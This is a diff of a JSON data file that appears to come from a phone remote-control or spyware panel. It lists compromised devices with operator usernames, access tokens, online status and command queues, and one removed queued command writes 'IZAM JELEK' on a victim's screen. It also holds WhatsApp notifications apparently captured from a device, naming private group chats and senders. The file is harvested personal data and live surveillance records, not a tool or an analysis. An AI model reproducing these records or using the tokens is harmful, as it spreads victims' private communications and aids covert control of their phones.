@@ -5571,6 +5571,38 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3128 pesan dari 21 chat",
+        "time": "21/04 18:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776769415414
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Pegasus-X Room: Owner Pega",
+        "content": "Menyebut grup Anda secara privat di status",
+        "time": "21/04 18:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776769415403
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3126 pesan dari 20 chat",
+        "time": "21/04 18:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776769415074
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎All Buyer Pegasus-X ( No Update ) (9 pesan): Owner Pega",
+        "content": "Menyebut grup Anda secara privat di status",
+        "time": "21/04 18:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776769415063
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "All Buyer Pegasus ( Full Update ): Owner Pega",
         "content": "Menyebut grup Anda secara privat di status",
         "time": "21/04 18:03",
@@ -9536,38 +9568,6 @@
         "time": "21/04 17:29",
         "pkg": "com.whatsapp",
         "receivedAt": 1776767397642
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (163 pesan): ~ N9THCRAL",
-        "content": "🛒 Leaving Group",
-        "time": "21/04 17:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776767397611
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎tungau esbeer (180 pesan): ~ .",
-        "content": "MN AD KE BENDUNGAN",
-        "time": "21/04 17:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776767397604
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (425 pesan): ~ jall store",
-        "content": "GB 0.1 DAGET SETIAP JUM'AT +400MEM",
-        "time": "21/04 17:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776767397596
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3778 pesan dari 19 chat",
-        "time": "21/04 17:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776767395626
       }
     ],
     "galleryPhotos": [],
@@ -9627,7 +9627,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776769409319,
+    "lastSeen": 1776769414462,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -13660,17 +13660,8 @@
     "deviceName": "HP-BBBB-732D",
     "ownerUsername": "pian",
     "token": "06c7d23d86c7cc434c3d79ed0920fb91",
-    "lastSeen": 1776769411691,
-    "commandQueue": [
-      {
-        "type": "screen_text",
-        "payload": {
-          "text": "IZAM JELEK",
-          "active": true
-        },
-        "sentAt": 1776769412619
-      }
-    ],
+    "lastSeen": 1776769414697,
+    "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:59:07.158Z",
     "deviceInfo": {
